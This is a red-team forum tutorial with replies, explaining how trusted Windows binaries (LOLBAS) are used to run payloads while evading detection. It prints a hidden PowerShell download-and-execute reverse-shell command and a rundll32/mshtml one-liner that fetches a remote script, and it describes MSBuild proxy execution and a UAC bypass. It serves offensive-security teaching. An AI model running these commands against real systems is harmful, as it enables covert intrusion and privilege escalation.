<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Execution (LOLBAS) - Red-Team - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Execution
In my previous post I talked about capturing hashes using a variety of different methods if you noticed these methods were utilizing LOLBAS also know as Living Off The Land Binaries and Scripts (and also Librar&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="21922.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Execution (LOLBAS)&#39;" href="21922.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/5/5547d2440777145e5788b06f5726baeedab5824f.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/5/5547d2440777145e5788b06f5726baeedab5824f.png" />
<meta property="og:url" content="https://0x00sec.org/t/execution-lolbas/21922" />
<meta name="twitter:url" content="https://0x00sec.org/t/execution-lolbas/21922" />
<meta property="og:title" content="Execution (LOLBAS)" />
<meta name="twitter:title" content="Execution (LOLBAS)" />
<meta property="og:description" content="Execution In my previous post I talked about capturing hashes using a variety of different methods if you noticed these methods were utilizing LOLBAS also know as Living Off The Land Binaries and Scripts (and also Libraries) but what are these Executable that I utilized???. They are Windows Trusted Binaries that come installed into the System already, by living off the Land we utilize trusted binaries from Windows to execute our Malicious Binaries, in my Gitbook I was explained why these are uti..." />
<meta name="twitter:description" content="Execution In my previous post I talked about capturing hashes using a variety of different methods if you noticed these methods were utilizing LOLBAS also know as Living Off The Land Binaries and Scripts (and also Libraries) but what are these Executable that I utilized???. They are Windows Trusted Binaries that come installed into the System already, by living off the Land we utilize trusted binaries from Windows to execute our Malicious Binaries, in my Gitbook I was explained why these are uti..." />
<meta property="og:article:section" content="Red-Team" />
<meta property="og:article:section:color" content="BF1E2E" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="2 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="10 ❤" />
<meta property="article:published_time" content="2020-06-25T00:00:31+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="21922.html">Execution (LOLBAS)</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/red-team/102.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #BF1E2E"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Red-Team</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Execution (LOLBAS)">
<meta itemprop="articleSection" content="Red-Team">
<meta itemprop="keywords" content>
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dmcxblue"><span itemprop="name">dmcxblue</span></a>
(David)
</span>
<link itemprop="mainEntityOfPage" href="21922.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/5/5547d2440777145e5788b06f5726baeedab5824f.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-06-25T00:00:31Z" class="post-time">
June 25, 2020, 12:00am
</time>
<meta itemprop="dateModified" content="2020-06-25T00:06:06Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<h1>Execution</h1>
<p>In my previous post I talked about capturing hashes using a variety of different methods if you noticed these methods were utilizing LOLBAS also know as <em><strong>Living Off The Land Binaries and Scripts (and also Libraries)</strong></em> but what are these Executable that I utilized???. They are Windows Trusted Binaries that come installed into the System already, by living off the Land we utilize trusted binaries from Windows to execute our Malicious Binaries, in my <a href="https://dmcxblue.gitbook.io/red-team-notes/execution" rel="noopener nofollow ugc">Gitbook</a> I was explained why these are utilized by APT (Advanced Persistent Threats) some of the reasons given were:</p>
<ul>
<li>Avoid creating new processes/network connections</li>
<li>Avoid creating anomalous parent/child relationships</li>
<li>Avoid creating/modifying files/registry entries</li>
<li>Avoid creating memory anomalies</li>
<li>Avoid leaving evidence in log files</li>
</ul>
<p>Why is this good?, well let me show you an Example if we execute a malicious binary or command that calls back to our attacking machine what does the Blue Team see??, Well if we use some of the tools available (SysInternals) this is a great way to view what is going on.</p>
<p>Let’s catch a Shell using a PowerShell Script.</p>
<pre><code class="lang-auto">powershell.exe -W 1 -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.15:8000/Connect-BDTcp.ps1');
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5547d2440777145e5788b06f5726baeedab5824f.png" alt data-base62-sha1="caqsC5CFWSlJJWHb3YFoh6BaoTt" width height></p>
<p>Shell</p>
<p>I used this command because I am telling power shell that I want the Window-Style as Hidden so when executed it is not shown (“Obviously!!”) on the Victim machine.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/019b1695cd98d5829a6e1c5b1fb32bc315416fcf.png" alt data-base62-sha1="ecKErrx4YDloNZ7IS4vh8isG4L" width height></p>
<p>No Window!!</p>
<p>But here comes in Sysinternals, Process Explorer what can we see with this Marvelous Tool.</p>
<p>Uh Oh, nothing good an obvious PowerShell execution, with a Network Connection being established.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e7dc45208463b02d45f1cd1f2733d717c6bd2411.png" alt data-base62-sha1="x58dLucoIXO8NSxramjRdpsj0Cl" width height></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f7ef086c7411b9e1ca9f83b0ef77b44683846116.png" alt data-base62-sha1="znk3LRkfeB2vZPKqlhyb9TFVG3c" width height></p>
<p>Not good this will get caught Immediately, Poor Opsec and very obvious to a tool for monitoring, we have to make this a little more difficult to catch, here come’s LOLBAS.</p>
<p>For the sake of Demonstration I will use RunDLL to call the same PowerShell Script and Execute. In the following example it combines with JavaScript so it can execute powershell and call the script remotely usually rundll32 will execute DLL files but this can be combined to execute commands as well.</p>
<pre><code class="lang-auto">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")
</code></pre>
<p>Here we go, a little better since rundll32 is a legit process sometimes it’s nothing to worry about. But…</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cc1d260bff3f54fde38d827433065ba7cc4f411a.png" alt data-base62-sha1="t7FQZ5R7FaWfSxBUgIxCD3Ich0m" width height></p>
<p>What is this Command Line Syntax being used!!!.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/72d95631f248d6ae7d7e5edaf615392794ca4792.png" alt data-base62-sha1="go04y0mEDqZbvVu7UFBJfRTkQX8" width height></p>
<p>Yes we manage to avoid the creation of a Child Process, and it doesn’t show a Network Connection.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1972d27fe8b243678be3062d39c488d15f2556fe.png" alt data-base62-sha1="3D7Wqj5ZFbUwBGLLHM0FoRJ47hQ" width height></p>
<p>But we have that Syntax that can give us away, at least you get the idea we hid ourselves properly this time by using a legitimate Windows binary to execute our malicious payload.</p>
<p>OK let’s continue, now that we know a little into why these are used let’s show another example on what they can be used for as well, let’s imagine we have initial access in one of our engagements but this environment is well aware of what is going on with hacking, blacklisted known extensions and it’s very restricted on what can be executed our primary suspects here are “EXE, DLL, HTA, SCR” these files are known for executing malicious malware so here LOLBAS enters again, in this example we have access in a Developer machine, Visual Studio is installed (You know where this is going) and MSBuild is available.</p>
<p><em><strong>MSbuild: Microsoft Build Engine is a software build platform used by Visual Studio. it takes XML formatted project files. Adversaries can use MSBuild to proxy execution of code through a trusted windows utility. The inline task allows for C# code to be inserted in the XML project to compile and execute the arbitrary code.</strong></em></p>
<p>In this example we hold a small shell and we are trying to upgrade into our C2, and we only have MSBuild available to execute we upload our XML payload to the victim machine and utilize MSBuild to execute.</p>
<p> <iframe width="640" height="360" src="https://player.vimeo.com/video/432322419" data-original-href="https://vimeo.com/432322419" frameborder="0" allowfullscreen seamless="seamless" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-presentation"></iframe>
<br>
MSBuild Example</p>
<p>Great we got a shell proxy executing with MSBuild using an XML file with C# code inserted so it may compile and execute.</p>
<p>Finally our last example, we know how to execute files, evade logs, and the creation of child processes and the use of trusted binaries to execute our malware. Now let me demonstrate an example on UAC Bypass and Privesc with one of these trusted binaries</p>
<p>I enumerated the Machine and it contains a privilege escalation vulnerability named “Always Install Elevated” (more info <a href="https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path" rel="noopener nofollow ugc">here</a>). I upload an MSI Malware and try to execute but what happens??.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2357a0b6c18e4c13b6e0da40baa5d2009d63f774.png" alt data-base62-sha1="52Es5ReMWFAduG2xGrNCiKXZ7Za" width height></p>
<p>No Shell</p>
<p>But why?, I got back to the Machine and I see this.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/524fd84ce91be874a78a984a90d9b0b17d98d1d4.png" alt data-base62-sha1="bKadBTIBcODf9aVNH0u9DOqV8oc" width height></p>
<p>UAC</p>
<p>Good old UAC, a feature implemented in Windows Vista, and Windows Server 2008, a more relaxed version on 7 and newer. Here come’s windows signed binaries again with these we can Bypass UAC, usually these binaries run with more elevated permissions or because Windows Trusts these to be executed (Now they are more monitored). But let’s see the Bypass in action.</p>
<p> <iframe width="640" height="360" src="https://player.vimeo.com/video/432336491" data-original-href="https://vimeo.com/432336491" frameborder="0" allowfullscreen seamless="seamless" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-presentation"></iframe>
</p>
<p>We worked with a few well known examples with windows signed binaries they are helpful for Executions and Bypasses these are few examples on what can be done with these Binaries you are more than welcome to review them <a href="https://lolbas-project.github.io/#" rel="noopener nofollow ugc">here</a> and in my <a href="https://dmcxblue.gitbook.io/red-team-notes/execution" rel="noopener nofollow ugc">Gitbook</a>. It will go more into detail and have various examples on what other things can be done.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="6" />
<span class="post-likes">6 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="21922.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-06-25T00:17:34Z" class="post-time">
June 25, 2020, 12:17am
</time>
<meta itemprop="dateModified" content="2020-06-25T00:17:34Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Wow man.</p>
<p>This is a fantastic article and I love the writing style. It’s really well written and I enjoy that you have formalized a lot of my thoughts on it, and how it has evolved as detection has gotten more advanced.</p>
<p>LOLBAS/LOLBINS are dope and a fundamental feature in pretty much every OS/Software package that exists.</p>
<p>EDIT: I love the videos, the screenshots and the visual nature of it is really kick-ass. Shows how much effort has gone into the writing!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dmcxblue"><span itemprop="name">dmcxblue</span></a>
(David)
</span>
<link itemprop="mainEntityOfPage" href="21922.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-06-25T01:50:41Z" class="post-time">
June 25, 2020, 1:50am
</time>
<meta itemprop="dateModified" content="2020-06-25T01:50:41Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thank You, I try my best to help people that are trying to jump into this awesome field.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="21922.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-10-24T16:07:17Z" class="post-time">
October 24, 2020, 4:07pm
</time>
<meta itemprop="dateModified" content="2020-10-24T16:07:17Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
